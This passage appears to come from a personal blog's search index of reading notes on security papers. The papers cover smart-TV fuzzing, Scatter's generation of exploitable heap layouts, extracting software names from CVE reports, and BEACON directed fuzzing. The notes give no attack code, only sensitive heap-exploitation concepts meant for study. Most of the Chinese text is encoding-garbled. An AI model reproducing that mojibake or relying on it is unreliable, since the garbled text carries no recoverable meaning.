ã€‚\n","permalink":"https://juhuax.github.io/posts/study/1.%E8%AE%BA%E6%96%87%E9%98%85%E8%AF%BB/fuzzing/2.%E8%AF%A6%E7%BB%86%E7%AC%94%E8%AE%B0/android-smarttvs-vulnerability-discovery-via-log-guided-fuzzing/","summary":"ä¸­æ–‡è¯‘åï¼šé€šè¿‡æ—¥å¿—å¼•å¯¼çš„å®‰å“æ™ºæ…§ç”µè§†æ¼æ´æ¨¡ç³Šæµ‹è¯• ä½œè€…ï¼šYousra Aafer å•ä½ï¼šæ»‘é“å¢å¤§å­¦ å›½å®¶ï¼š #æ³•å›½ å¹´ä»½ï¼š #2021å¹´ æ¥æºï¼š #USENIXä¼šè®® å…³","title":"Android SmartTVs Vulnerability Discovery via Log-Guided Fuzzing"},{"content":"ä¸­æ–‡è¯‘åï¼šé€šè¿‡æ“çºµè·ç¦»å¼•å¯¼çš„æ¨¡ç³Šæµ‹è¯•è‡ªåŠ¨ç”Ÿæˆå †æº¢å‡ºçš„å¯åˆ©ç”¨å †å¸ƒå±€ ä½œè€…ï¼šBin Zhang å•ä½ï¼šå›½é˜²ç§‘å¤§ å›½å®¶ï¼š #ä¸­å›½ å¹´ä»½ï¼š #2023å¹´ æ¥æºï¼š #USENIXä¼šè®® å…³é”®å­—ï¼š #fuzzing #AGE ä»£ç åœ°å€ï¼šEpeius/Scatter: Automatically Generate Exploitable Memory Layout for HeapOOB-Write Vulnerabilities in Non-Interpreter Software (github.com) ï¼ˆä»£ç æ²¡æœ‰ä¸Šä¼ ï¼Œåªæœ‰readmeï¼‰ ç¬”è®°å»ºç«‹æ—¶é—´ï¼š 2023-05-31 09:35\nAbstract heap primitives are leveraged to construnct exploitable states prior efforts only focus on particular program types or programs with dispatcher-loop structures, these are hard for general-purpose programs this paper present scatter, enabling the generation of exploitable heap layouts for heap overflows in generalpurpose programs in a primitive-free manner. Background A heap primitive is a code snippet that invokes one or more heap operations (such as malloc and free), and it is often invoked multiple times with a certain program input. using heap overflows vulnerabilities to achieve control flow hijacking need strict control of heap allocations, which is challenging Existing approaches to constructing exploitable heap layouts can be categorized into two types: modeling-based approaches and fuzzing-based approaches. existing approaches rely on heap primitives that are easy to be utilized in specific programs å…³äº A Running Example çš„è§£é‡Š å›¾ä¸­çš„få’Œmæ˜¯æŒ‡freeå’Œmallocï¼Œä»£ç ï¼ˆlisting 1ï¼‰ä¸­æœ‰æ³¨é‡Šã€‚ listing1çš„æ¼æ´åœ¨äºå¯ä»¥è¾“å…¥è¶…è¿‡ç”³è¯·chunkå¤§å°çš„è¾“å…¥è€Œé€ æˆå †æº¢å‡ºã€‚ å¯åˆ©ç”¨çš„å †æº¢å‡ºæ˜¯æŒ‡å¯ä»¥ä»å½“å‰chunkæº¢å‡ºåˆ°ä¸‹ä¸€ä¸ªchunkçš„å¤´ï¼Œä»è€Œä¿®æ”¹chunkçš„å±æ€§ã€‚ æ‰€ä»¥ç®€å•çš„pocï¼ˆè®ºæ–‡ä¸­ç»™å‡ºçš„0x100ä¸ªå­—èŠ‚çš„pocï¼‰åªèƒ½é€ æˆç¨‹åºå´©æºƒæˆ–è€…ç”šè‡³éƒ½ä¸ä¼šé€ æˆç¨‹åºå´©æºƒã€‚ æƒ³è¦å †æº¢å‡ºå°±éœ€è¦æ„é€ å †çš„å¸ƒå±€ï¼Œå°±æ˜¯å›¾ä¸­å³è¾¹ï¼Œä¹Ÿå°±æ˜¯è¾“å…¥epocã€‚epocç²¾å¿ƒæ„é€ çš„ç›®çš„å°±æ˜¯è®©æœ€åä»£ç çš„45è¡Œè¾“å…¥çš„puredataå¯ä»¥æ”¾å…¥å †å—Aï¼Œè¿™æ ·æº¢å‡ºåå°±å¯ä»¥å½±å“åˆ°å †å—Bçš„å¤´ï¼Œç”šè‡³Cçš„å¤´ä¹Ÿå¯ä»¥ã€‚ å¦‚æœä¸ç²¾ç»†æ„é€ çš„è¯è¾“å…¥çš„puredataçºµç„¶äº§ç”Ÿäº†å †æº¢å‡ºï¼Œä½†æ˜¯æ²¡æœ‰å½±å“åˆ°å…¶ä»–å †å—ã€‚\nMethodology input is the source code of target program and the PoC that triggers a heap overflow vulnerability output are ePoCs that construct exploitable heap layouts\nIdentifying Victim Objects indentify the sensitive structures by static analysis sensitive structures: a structure that contains pointers a structure that has no pointers but contains a member that can affect a buffer\u0026rsquo;s access a union structure that contains previous two types of structures and is accessed as its structure type è¿™æ­¥éª¤æ˜¯ç”¨æ¥è¯†åˆ«ä»£ç ä¸­å¯¹sensitive structuresçš„å®šä¹‰ï¼ˆçŒœæµ‹ï¼‰ identify potential victim objects at runtime by dynamic instrumentation (ä¸ºå•¥éœ€è¦åŠ¨æ€åˆ†æ) after recognizing, scatter locates all victim object allocation points by indentifying heap operations that allocate or free memory for the sensitive structures è¿™éƒ¨åˆ†æ˜¯è¯†åˆ«ä»£ç ä¸­å¯¹sensitive structuresçš„freeå’Œmacllocæ“ä½œ analyze the type for the return of allocation functions é€šè¿‡åˆ†æLLVM IR Pinpointing Critical Input Bytes è¿™éƒ¨åˆ†ç”¨äºè¯†åˆ«è¾“å…¥ä¸­å¯èƒ½å½±å“å †æ“ä½œçš„å­—èŠ‚\nIdentifying Mutable Operations è¿™ä¸ªå¯å˜æ“ä½œåº”è¯¥æŒ‡çš„æ˜¯å—è¾“å…¥å½±å“çš„å¯¹æ“ä½œï¼Œè¿™å½±å“å¯ä»¥æ˜¯æ‰§è¡Œæ¬¡æ•°ï¼Œä¹Ÿå¯ä»¥æ˜¯æ‰§è¡Œå‚æ•° build LDGï¼ˆLayout Dependence Graphï¼‰ï¼šSCATTER firstly utilizes a heap-operation-guided fuzzer to explore different execution paths, and then extracts heap operations and control flow information on each path.ï¼ˆè¿™é‡Œå’‹å®ç°çš„ï¼‰ SCATTER identifies mutable heap operations by identifying whether the parameters or execution times of the operations change when giving different program inputs. leverages dynamic taint analysis technique to check whether an operationâ€™s parameters can be affected by the input bytes. Mapping to Input Bytes leverages a lightweight â€œmutate-checkâ€ strategy to locate input bytes that can affect mutable heap operations. å…ˆä»¥è¾“å…¥aæ‰§è¡Œä¸€æ¬¡ç¨‹åºï¼Œæ”¶é›†å‚æ•°å’Œå¯å˜å †æ“ä½œå‡ºç°çš„æ¬¡æ•°ã€‚ç„¶åå¯¹aè¿›è¡Œå¤šæ¬¡å˜å¼‚ï¼Œæ‰§è¡Œç¨‹åºï¼Œæ£€æŸ¥å‚æ•°å’Œå¯å˜å †æ“ä½œçš„æ¬¡æ•°æ˜¯å¦å˜åŒ–ã€‚ Modeling Fuzzing-Based Manipulation a. collect a set of victim objects, determine their locations in the heap\nthrough dynamic instrumentation, obtain all victim objects that are alive in heap b. adjust vulnerable object\u0026rsquo;s location according to the victim objects\u0026rsquo; locations through fuzzing, based on the manipulation distance metric\nfor each victim object, we traverse the trace of heap operations to locate all suitable free chunks for placing the vulnerable object and calculate the manipulation distances. the suitable free chunks following requirements: (1) it is freed before allocating ov and has the same size with ov; (2) ov can overflow into os when ov is placed into this free chunk. Defining Basic Manipulation Distance distance is based on the heap operation a. the position of free chunk c in the free list nA and nF denote the number of allocation and the number of free operations with the same size of c in âƒ— Ro, respectively. (heap operations âƒ— Ro between câ€™s free and ovâ€™s allocation) Î¶{0,1} = 0 if câ€™s free list is FIFO, otherwise, Î¶{0,1} = 1 for FILO. Î´ represents the position index (start from 1) of c in the free list according to the allocation order. b. basic manipulation distance (to corrupt a victim object os by placing the vulnerable object ov into a free chunk c) (è¿™æŠŠä¸Šé¢çš„å¼å­ä»£å…¥ä¸æ˜¯0å—ï¼Ÿå•¥æ„æ€)\nHandling Early Occupation Problem occupation problem means our target chunk c will be not free when we allocate the vulnerable object the smaller overload factor is, the less likely occupation problem is to occur combine the overload factor and Basic Manipulation Distance, the extended manipulation distance d is : Handling Split-Merge Mechanism this part don\u0026rsquo;t change the equation of distance, author build a model for the $n_A$ and $n_F$ based on the different situation of chunk split and merge.\nManipulation Distance-Guided Fuzzing extract the heap operation trace, the vulnerable object, and all alive victim objects when the overflow occurs For each SCATTER calculates the distance to corrupt it. By iteratively reducing the distance to 0, SCATTER generates the final ePoCs. two challenge how to determine a mutated PoC triggers the same vulnerability as the initial PoC does\nFor two PoCs, if their vulnerable objectsâ€™ allocation points and overwriting points from the ASANâ€™s reports are same, we regard them as triggering the same heap overflow. which PoCs deserve higher priorities to fuzz and how much mutation energy should be assigned?\nSCATTER is based on genetic algorithms and selects the seeds according to the following criteria: Shorter distance More victim objects More free chunks Diverse heap operation sequences The priorities for the criteria are (from high to low): shorter distance, more victim objects, more free chunks and diverse heap operation sequences. base on these criteria, author set a expansion factor to adjust the mutation energy obtained by coverage-based fuzzing Evaluation ePOC Generation æ€»ä½“ä¸Šçœ‹èµ·æ¥è¿™ä¸ªsensitive structçš„è¯†åˆ«ç‡ä¸æ˜¯å¾ˆé«˜ ç–‘é—®ï¼šsensitive structæ€»æ•°æ˜¯å“ªé‡Œæ¥çš„ï¼Œå’Œidentifyçš„æœ‰å•¥åŒºåˆ« the author believe that the reasons of failed cases are\nLimited number of victim objects Limited heap operations Limited explored paths the heap operations on the explored pathes are unable to adjust the location of the vulnerable object complex path constraints. Running Failure Comparison with State-of-the-Art AFLcrashæ„è¯†æ˜¯AFLçš„å´©æºƒæµ‹è¯•æ¨¡å¼ AFLcritæ˜¯ç»™AFLå–‚SCATTERè¯†åˆ«çš„å…³é”®å­—èŠ‚ SCAgæ˜¯ç”¨Gollumâ€™s distance SCA*æ˜¯ç”¨AFLçš„èƒ½é‡åˆ†é…ç­–ç•¥ Time Consumption æ€»ä¹‹å°±æ˜¯å®ƒå¿«\nLimitation Other General Heap Managers Customized Heap Managers Multi-threads. Summary by myself explored pathæ˜¯å•¥ ç»“åˆCase Studyå›é¡¾ä¸€ä¸‹\nç›®çš„ï¼š æ–¹æ³•ï¼š æ„ä¹‰ï¼š æ•ˆæœï¼š\n","permalink":"https://juhuax.github.io/posts/study/1.%E8%AE%BA%E6%96%87%E9%98%85%E8%AF%BB/fuzzing/2.%E8%AF%A6%E7%BB%86%E7%AC%94%E8%AE%B0/automated-exploitable-heap-layout-generation-for-heap-overflows-through-manipulation-distance-guided-fuzzing/","summary":"ä¸­æ–‡è¯‘åï¼šé€šè¿‡æ“çºµè·ç¦»å¼•å¯¼çš„æ¨¡ç³Šæµ‹è¯•è‡ªåŠ¨ç”Ÿæˆå †æº¢å‡ºçš„å¯åˆ©ç”¨å †å¸ƒå±€ ä½œè€…ï¼šBin Zhang å•ä½ï¼šå›½é˜²ç§‘å¤§ å›½å®¶ï¼š #ä¸­å›½ å¹´ä»½ï¼š #2023å¹´ æ¥æºï¼š #USENI","title":"Automated Exploitable Heap Layout Generation for Heap Overflows Through Manipulation Distance-Guided Fuzzing"},{"content":"ä¸­æ–‡è¯‘åï¼šåˆ©ç”¨ LSTM å’Œä¸“å®¶ç³»ç»Ÿä»æ¼æ´æŠ¥å‘Šä¸­è‡ªåŠ¨æå–è½¯ä»¶åç§° ä½œè€…ï¼šIgor Khokhlov å•ä½ï¼šåœ£å¿ƒå¤§å­¦ å›½å®¶ï¼š #æ„å¤§åˆ© å¹´ä»½ï¼š #2022å¹´ æ¥æºï¼š #IEEE_STC å…³é”®å­—ï¼š #æå–ä¿¡æ¯ ä»£ç åœ°å€ï¼š ç¬”è®°å»ºç«‹æ—¶é—´ï¼š 2023-05-15 10:20\nAbstract proposes a machine learning method to extract software product names and version from unstructured CVE descriptions automatically create context-aware features by using Word2Vec and Char2Vec use this features to train a NER model using LSTM based on the previously published CVE descriptions, author create a set of Expert System (ES) rules to refine the predictions of the NER model and improve the preformance of the developed method. METHODOLOGY use two major models: NER model and ES model\nNER model is responsible for classify each word within the description as software name (SN), software version (SV), other (O) ES model is responsible for verify the result of NER model NER ES and Rules author examined the dataset and found that 61.5% of all SN in the dataset occurs within the first ten words in the sentence and almost 91% of all SN lies within the first 30 words of the sentence. almost 73% of all SV lies no further than five words from the related SN, and almost 90% within ten words proximity. Software Name Extraction Rules The word is classified as NNP and within 40 words range from the sentence beginning and does not belong to an article and is in the CPE dictionary. This rule is based on the training dataset analysis (see Table I). 2) The word is between two SNs. The word is between two SNs. Software Version Extraction Rules It contains digits and is not further than 30 words from the last SN. This rule is based on the training dataset analysis It is in the list of trigger words and is not further than 30 words from the last SN It contains digits, and the previous word is classified as an SV This word is â€œandâ€ or â€œorâ€ and is between two SVs. ç›®çš„ï¼š æ–¹æ³•ï¼š æ„ä¹‰ï¼š æ•ˆæœï¼š\n","permalink":"https://juhuax.github.io/posts/study/1.%E8%AE%BA%E6%96%87%E9%98%85%E8%AF%BB/fuzzing/2.%E8%AF%A6%E7%BB%86%E7%AC%94%E8%AE%B0/automated-extraction-of-software-names-from-vulnerability-reports-using-lstm-and-expert-system/","summary":"ä¸­æ–‡è¯‘åï¼šåˆ©ç”¨ LSTM å’Œä¸“å®¶ç³»ç»Ÿä»æ¼æ´æŠ¥å‘Šä¸­è‡ªåŠ¨æå–è½¯ä»¶åç§° ä½œè€…ï¼šIgor Khokhlov å•ä½ï¼šåœ£å¿ƒå¤§å­¦ å›½å®¶ï¼š #æ„å¤§åˆ© å¹´ä»½ï¼š #2022å¹´ æ¥æºï¼š #IEEE_STC å…³é”®å­—ï¼š #æå–ä¿¡","title":"Automated Extraction of Software Names from Vulnerability Reports using LSTM and Expert System"},{"content":"ä¸­æ–‡è¯‘åï¼šä¿¡æ ‡: å…·æœ‰å¯è¯æ˜è·¯å¾„å‰ªæçš„å®šå‘ç°ç›’æ¨¡ç³Šæµ‹è¯• ä½œè€…ï¼šHuang Heqing å•ä½ï¼šé¦™æ¸¯ç§‘æŠ€å¤§å­¦ å›½å®¶ï¼š #ä¸­å›½ å¹´ä»½ï¼š #2022å¹´\næ¥æºï¼š #SP å…³é”®å­—ï¼š #å®šå‘fuzzing ä»£ç åœ°å€ï¼š https://hub.docker.com/r/yguoaz/beacon ç¬”è®°å»ºç«‹æ—¶é—´ï¼š 2023-05-09 17:27\næ‘˜è¦ å½“å‰çš„å®šå‘ fuzzer ä¸å¤Ÿé«˜æ•ˆï¼Œå› ä¸ºå®ƒä»¬ç¬¦å·åŒ–æˆ–è€…å…·ä½“çš„æ‰§è¡Œäº†å¾ˆå¤šä¸ä¼šåˆ°è¾¾ target code åˆ°çš„ pathï¼Œæµªè´¹äº†å¾ˆå¤šè®¡ç®—èµ„æº beaconâ€”â€”é€šè¿‡ä¸€ç§å¯è¯æ˜çš„æ–¹å¼åœ¨è·¯å¾„ä¹‹æµ·ä¸­å¼•å¯¼ç°ç›’æ¨¡ç³Šæµ‹è¯• è½»é‡çº§çš„é™æ€åˆ†æâ€”â€”ç”¨äºè®¡ç®—åˆ°è¾¾ç›®æ ‡çš„å…ˆå†³æ¡ä»¶â€”â€”ç”¨äºä¿®å‰ªæ— æ³•åˆ°è¾¾ target çš„è·¯å¾„ å¼•è¨€ ä¼ ç»Ÿæ¨¡ç³Šæµ‹è¯•åº”ç”¨äº æ£€æµ‹æ¼æ´è·¯å¾„ ç”Ÿæˆæ½œåœ¨æ¼æ´çš„ poc å´©æºƒå¤ç° è¿½è¸ªä¿¡æ¯æµ å®šå‘ fuzzing ç°çŠ¶ å®šå‘ç™½ç›’æ¨¡ç³Šå™¨ä¾é ç¬¦å·æ‰§è¡Œï¼Œé€šè¿‡æ±‚è§£è·¯å¾„çº¦æŸæ¥ç¡®å®šå¯è¾¾æ€§ï¼Œæ—¨åœ¨ä¸ºç”Ÿæˆèƒ½å¤Ÿåˆ°è¾¾ç›®æ ‡çš„è¾“å…¥æä¾›ç†è®ºä¿è¯ã€‚å› æ­¤ï¼Œå®ƒä»¬å¯¹ç¬¦å·æ‰§è¡Œçš„å›ºæœ‰ä½¿ç”¨ä»æ ¹æœ¬ä¸Šé™åˆ¶äº†å®ƒä»¬çš„æ‰©å±•èƒ½åŠ›ã€‚ å®šå‘ç°ç›’æ¨¡ç³Šå™¨é€šå¸¸ä¸è€ƒè™‘æ‹’ç»ä¸å¯è¾¾è·¯å¾„ã€‚å®ƒä»¬ä¾é ä»æ‰§è¡Œåé¦ˆä¸­æ”¶é›†çš„å¯å‘å¼æ–¹æ³•ï¼Œæ ¹æ®åˆ°è¾¾ç›®æ ‡ä»£ç çš„å¯èƒ½æ€§å¯¹ç§å­è¿›è¡Œä¼˜å…ˆæ’åºã€‚ä»–ä»¬è¦ä¹ˆä½¿ç”¨è½»é‡çº§çš„å…ƒå¯å‘å¼ï¼Œä¾‹å¦‚ï¼Œåˆ°ç›®æ ‡çš„è·ç¦»ï¼Œè¦ä¹ˆä½¿ç”¨æœºå™¨å­¦ä¹ æŠ€æœ¯æ¥é¢„æµ‹å¯è¾¾æ€§ï¼Œä½†ä¸èƒ½ä¿è¯è¿™ç§ä¼˜å…ˆçº§ä¼šå¯¼è‡´æ‹’ç»ä»»ä½•ä¸å¯è¡Œçš„è·¯å¾„ã€‚å› æ­¤ï¼Œåœ¨ AFLGo ä¸­æåˆ°çš„24å°æ—¶å®éªŒä¸­ï¼Œ95%ä»¥ä¸Šçš„è¾“å…¥æ— æ³•åˆ°è¾¾ç»™å®šçš„ç¨‹åºç‚¹ã€‚ å®šå‘ fuzzing çš„å…³é”®åœ¨äºå°½å¯èƒ½æ—©çš„å‰”é™¤ä¸èƒ½åˆ°è¾¾ target çš„æ‰§è¡Œè·¯å¾„ BEACON è€—è´¹ä½çš„é™æ€åˆ†æè®¡ç®—ç¨‹åºå˜é‡çš„åˆç†è¿‘ä¼¼å€¼ï¼Œè¿™äº›å€¼ç”¨äºå†³å®šæŸæ¡è·¯å¾„æ˜¯å¦å¯ä»¥åˆ°è¾¾ target ä¸ºäº†ä½¿å¾—é™æ€åˆ†æç²¾ç¡®åˆé«˜æ•ˆï¼Œé‡‡ç”¨äº†ä¸¤ç§æ–°çš„ä¼˜åŒ–æ–¹æ³•ï¼šå…³ç³»ä¿æŒå’Œæœ‰ç•Œæå– åŸºäºæ­¤å¯¹æ¨¡ç³Šæµ‹è¯•ä¸­è¦æ‰§è¡Œçš„è·¯å¾„è¿›è¡Œä¿®å‰ªï¼ˆä½œè€…ç§°å¯ä»¥è¾¾åˆ° 80%ä»¥ä¸Šçš„ä¿®å‰ªï¼‰ åœ¨è·¯å¾„é‡åˆ°æ§åˆ¶æµå›¾ä¸Šä¸èƒ½åˆ°è¾¾ç›®æ ‡çš„æŒ‡ä»¤æ—¶ï¼Œç›´æ¥å¯¹è·¯å¾„è¿›è¡Œå‰ªæ å¯åˆ°è¾¾ç›®æ ‡ä½†è·¯å¾„æ¡ä»¶ä¸æ»¡è¶³çš„è·¯å¾„è¿›è¡Œå‰ªæ æé«˜ï¼š BEACON å¹³å‡å¯ä»¥æ—©æœŸæ‹’ç»82.94%çš„è·¯å¾„ ä¸ä¼ ç»Ÿçš„å®šå‘æ¨¡ç³Šå™¨ç›¸æ¯”ï¼Œé€Ÿåº¦æé«˜äº†11.50å€ å¯¹äº AFLã€afl++å’Œ Mopt ç­‰ fuzzers, BEACON å¯ä»¥åˆ†åˆ«åŠ é€Ÿ6.31å€ã€11.86å€å’Œ10.92å€æ¥é‡ç°ç›®æ ‡ bug BEACON å‘ç°äº†14ä¸ªä¸å®Œæ•´çš„ä¿®å¤å’Œ8ä¸ªæ–° bug æ¦‚è¿° è¾“å…¥ä¸ºç¨‹åºæºä»£ç å’Œæ¨¡ç³Šæµ‹è¯•ç›®æ ‡ é¦–å…ˆè¿›è¡Œå¯è¾¾æ€§åˆ†æï¼Œå‰”é™¤æ— æ³•åˆ°è¾¾ä»»ä½•ç›®æ ‡çš„è·¯å¾„ è¿›è¡Œåå‘åŒºé—´åˆ†æ å› ä¸ºé€‰æ‹©äº†åŒºé—´åŸŸä½œä¸ºå…ˆå†³æ¡ä»¶çš„æŠ½è±¡ï¼ŒæŸå¤±äº†ç²¾ç¡®åº¦ï¼Œæ‰€ä»¥é‡‡ç”¨ä»¥ä¸‹ä¸¤ç§ä¼˜åŒ–æ–¹æ³• å…³ç³»ä¿æŒâ€”â€”ä¿ç•™è®¡ç®—å¼ç±»çš„çº¦æŸæ¡ä»¶ è¾¹ç•Œæå–â€”â€”è®¾å®šé˜ˆå€¼ï¼Œè¶…è¿‡é˜ˆå€¼æ‰åˆå¹¶è·¯å¾„ æœ‰é€‰æ‹©æ€§çš„æ’æ¡© åœ¨ BEACON ä¸­ï¼Œæˆ‘ä»¬æ£€æµ‹ä¸¤ç§è¯­å¥: å˜é‡å®šä¹‰è¯­å¥å’Œåˆ†æ”¯è¯­å¥ æ’æ¡©ç”¨äºä¿®å‰ªè·¯å¾„ æ–¹æ³• é¢„å¤‡å·¥ä½œ ä½œè€…ç»™å‡ºäº†ä¸€ä¸ªè¯­è¨€ç®€åŒ–è¡¨ç¤ºçš„è¯­æ³• è½¬æ¢è§„åˆ™ Backward Interval Analysis ä»¥å›¾äºŒä¸ºä¾‹ï¼Œç”¨è¯¥ç®—æ³•è¿›è¡Œåˆ†æï¼Œä» 18 è¡Œå¼€å§‹å‘ä¸Šåå‘åˆ†æï¼Œåˆå§‹çš„åç½®æ¡ä»¶æ˜¯ trueï¼Œå½“åˆ†æåˆ°ç¬¬ 9 è¡Œæ—¶ï¼Œç¢°åˆ°äº†ç¬¬ä¸€ä¸ªåˆ†æ”¯, æ­¤æ—¶çš„å…ˆéªŒæ¡ä»¶åˆ†è£‚ä¸ºä¸¤æ¡ï¼Œåˆ†åˆ«æ˜¯ï¼š åœ¨å®é™…åˆ†æä¸­å¯èƒ½ä¼šåˆ†è£‚ä¸ºè®¸å¤šæ¡ï¼Œè¿›è¡Œæ±‚è§£éå¸¸å¤æ‚ï¼ŒåŒæ—¶è¿˜éœ€è¦åœ¨ 18 è¡Œè¿›è¡Œåˆå¹¶ï¼Œè¿˜ä¼šä¸¢å¤±ä¸€å®šçš„ç²¾åº¦ã€‚ ä¸ºäº†æé«˜æ•ˆç‡ï¼Œæˆ‘ä»¬å»ºè®®ä½¿ç”¨åŒºé—´æŠ½è±¡æ¥æ”¯æŒè·¯å¾„æ¡ä»¶çš„è½»é‡çº§æ¨ç†å’Œåå‘è·¯å¾„çš„åˆç†è¿‡åº¦é€¼è¿‘ã€‚ï¼ˆç®—æ³• 7-18 è¡Œï¼‰ ç»è¿‡åˆå¹¶åçš„ pc 1 å’Œ pc 2 å¦‚ä¸‹å›¾ï¼š ç»¼ä¸Šï¼Œæˆ‘ä»¬å¯ä»¥çœ‹åˆ°åå‘é—´éš”åˆ†æè´Ÿè´£å¾—åˆ°ä¸€ä¸ªåˆç†é€¼è¿‘çš„ target çš„å…ˆéªŒæ¡ä»¶\nOptimizations for Maintaining Precision Relationship Preservation æˆ‘ä»¬è®¾è®¡äº†å¦‚å›¾5æ‰€ç¤ºçš„æ¨æ–­è§„åˆ™æ¥æ‰§è¡Œé—´éš”æŠ½è±¡ã€‚ ä¸ä¼ ç»Ÿçš„åŒºé—´åˆ†æä¸åŒï¼Œæˆ‘ä»¬çš„åˆ†æä¸ä»…è·Ÿè¸ªå˜é‡çš„åŒºé—´ï¼Œè¿˜è·Ÿè¸ªè·¯å¾„æ¡ä»¶ä¸­å‡ºç°çš„è¡¨è¾¾å¼ã€‚ ä½¿ç”¨è¿™äº›è§„åˆ™æ¥åˆ†æ pc 2ï¼Œä¸ä¼ ç»Ÿçš„åˆ†æçš„åŒºåˆ«å¦‚ä¸‹å›¾æ‰€ç¤º å¯ä»¥çœ‹åˆ°åˆ†æç»“æœè¦æ¯”ä¼ ç»Ÿçš„åŒºé—´åˆ†æç²¾åº¦æ›´é«˜ã€‚ Bounded Disjunctions å½“è·¯å¾„æ•°é‡å°äºé˜ˆå€¼çš„æ—¶å€™ï¼Œä¸è¿›è¡Œåˆå¹¶ï¼Œä¿ç•™äº†ç²¾åº¦ å½“è·¯å¾„å¤§äºé˜ˆå€¼çš„æ—¶å€™ï¼Œå°±éœ€è¦åˆå¹¶ï¼Œåˆå¹¶å°±æ„å‘³ç€è¦ä¸¢å¤±ç²¾åº¦ï¼Œ ä¸Šå›¾çš„ AB åˆå¹¶ï¼Œå°±ä¼šæŸå¤±ä¸­é—´éƒ¨åˆ†çš„ç²¾åº¦ï¼Œä¸‹é¢ AB åˆå¹¶ä¸ä¼šæœ‰ç²¾åº¦æŸå¤± ä¾ç…§ä¸Šè¿°å…¬å¼è¿›è¡Œè®¡ç®—æŸå¤±ï¼Œå“ªä¸ªåˆå¹¶æŸå¤±å°‘ï¼Œå°±åˆå¹¶å“ªä¸¤ä¸ªè·¯å¾„ ä¾‹å­ Precondition Instrumentation æˆ‘ä»¬é¦–å…ˆå°†ç¨‹åºè½¬æ¢ä¸º SSA å½¢å¼[42]ï¼Œå¹¶ä¸”åªè€ƒè™‘å˜é‡å®šä¹‰ä½œä¸ºæ’è£…çš„å€™é€‰ç¨‹åºä½ç½®ã€‚è¿™æ˜¯æ­£ç¡®çš„ï¼Œå› ä¸º SSA è¡¨å•ä¿è¯å˜é‡åœ¨å®šä¹‰ä¹‹åä¸ä¼šè¢«å†™å…¥ã€‚ å½“å˜é‡ v1çš„å€¼ä»…ä¾èµ–äºå¦ä¸€ä¸ªå˜é‡ v2æ—¶ï¼Œä¸åº”è¯¥æ£€æµ‹ v1ã€‚è¿™äº›ä¿¡æ¯å¯ä»¥é€šè¿‡å®šä¹‰æ•°æ®æµåˆ†ææ¥è®¡ç®—[43]ã€‚ä¾‹å¦‚ï¼Œåœ¨å›¾2ä¸­ï¼Œv ä»…ä¾èµ–äº u è€Œä¸æ˜¯ x æˆ– zã€‚ è¯„ä»· å®ç° åŸºäºLLVMå®ç°æ‰§è¡Œå…ˆå†³æ¡ä»¶åˆ†æã€æ£€æŸ¥å…ˆå†³æ¡ä»¶çš„æ£€æµ‹å’Œå…¶ä»–ä¸è¦†ç›–ç‡ç›¸å…³çš„æ£€æµ‹ï¼Œè¾“å‡ºå¯æ‰§è¡Œçš„äºŒè¿›åˆ¶æ–‡ä»¶ ä½¿ç”¨AFLGoä½œä¸ºæ¨¡ç³Šæµ‹è¯•å¼•æ“ Compared to the State of the Art å’ŒAFLGoæ¯”è¾ƒ BEACONåˆ†åˆ«åœ¨Binutilsã€Mingå’ŒLrzipä¸­æ£€æµ‹åˆ°3ä¸ªã€9ä¸ªå’Œ2ä¸ªä¸å®Œæ•´çš„è¡¥ä¸ï¼Œä»¥åŠ8ä¸ªé¢å¤–çš„bugï¼Œè€ŒAFLGoåªæ£€æµ‹åˆ°6ä¸ªä¸å®Œæ•´çš„è¡¥ä¸ã€‚ å¯¹äºé‚£äº›å¯åœ¨AFLGoä¸­é‡ç°çš„æ¼æ´ï¼ŒBEACONéœ€è¦è¾ƒå°‘çš„è¦†ç›–ç‡ (å¹³å‡91.2%) åœ¨æŸäº›åœºæ™¯ä¸‹ï¼Œç‰¹åˆ«æ˜¯åœ¨AFLGoæ— æ³•é‡ç°æ¼æ´çš„æƒ…å†µä¸‹ï¼ŒBEACONå¯ä»¥å®ç°æ›´é«˜çš„è¦†ç›–ç‡ã€‚ å’ŒHawkeyeæ¯”è¾ƒ BEACONå¯¹æ‰€æœ‰æ¼æ´çš„å†ç°å‡ä¼˜äºAFLGoå’ŒHawkeyeï¼Œä¸”på€¼å‡å°äº0.05ã€‚ç‰¹åˆ«æ˜¯å¯¹äºCVE-2016-4491å’ŒCVE-20166131, BEACONç›¸æ¯”Hawkeyeå¯ä»¥å®ç°3.6å€å’Œ5.7å€çš„åŠ é€Ÿã€‚ å’ŒAFL, AFL++, and Moptæ¯”è¾ƒ ä¸åŸå§‹å·¥å…·ç›¸æ¯”ï¼ŒAFL+BEACON AFL++ BEACONå’ŒMopt+BEACONåˆ†åˆ«å¯ä»¥å®ç°6.31å€ã€11.86å€å’Œ10.92å€çš„åŠ é€Ÿã€‚ è·¯å¾„åˆ‡ç‰‡çš„å½±å“ä¸å‰ææ¡ä»¶æ£€æŸ¥ åœ¨é‡ç°æ¼æ´æ–¹é¢ï¼ŒBEACONæ¯”BEACON*è¦å¿«å¾—å¤š (1.1å€åˆ°18.4å€)ï¼Œå› ä¸ºå®ƒå¹³å‡æ¯”BEACONå¤šä¿®å‰ª29.1%çš„è·¯å¾„ã€‚åœ¨æŸäº›æƒ…å†µä¸‹ (ä¾‹å¦‚ï¼ŒCVE-2017-8397)ï¼Œ BEACON *ç”šè‡³æ— æ³•åœ¨120å°æ—¶å†…é‡ç°æ¼æ´ã€‚è¿™ä¸€ç»“æœè¯æ˜äº†å‰ç½®æ¡ä»¶åˆ†æçš„é‡è¦æ€§å’Œå¿…è¦æ€§ï¼Œä½¿æˆ‘ä»¬çš„æ€§èƒ½å¾—åˆ°äº†æ˜¾è‘—çš„æé«˜ã€‚ å…³ç³»ä¿æŒä¸æœ‰ç•Œæå–çš„å½±å“ åœ¨é‡ç°æ¼æ´æ—¶ï¼ŒBEACONæ¯”BEACON-rpå’ŒBEACON-bdåˆ†åˆ«å¿«å¾—å¤š (1.05å€åˆ°4.9å€ï¼Œ1.05å€åˆ°5.34å€)ã€‚è¿™ä¸€ç»“æœè¯æ˜äº†è¿™ä¸¤ç§ç­–ç•¥çš„é‡è¦æ€§å’Œå¿…è¦æ€§ï¼Œå› ä¸ºå®ƒä»¬éƒ½æœ‰åŠ©äºå‰ææ¡ä»¶åˆ†æçš„ç²¾åº¦ï¼Œå®ƒä»¬çš„ç»„åˆå¯ä»¥ä½¿æˆ‘ä»¬åœ¨æ¨¡ç³Šæµ‹è¯•ä¸­è·å¾—æ›´é«˜çš„ç²¾åº¦å¹¶ä¿®å‰ªæ›´å¤šçš„è·¯å¾„ã€‚ å½“ç»‘å®šé˜ˆå€¼ä»5å¢åŠ 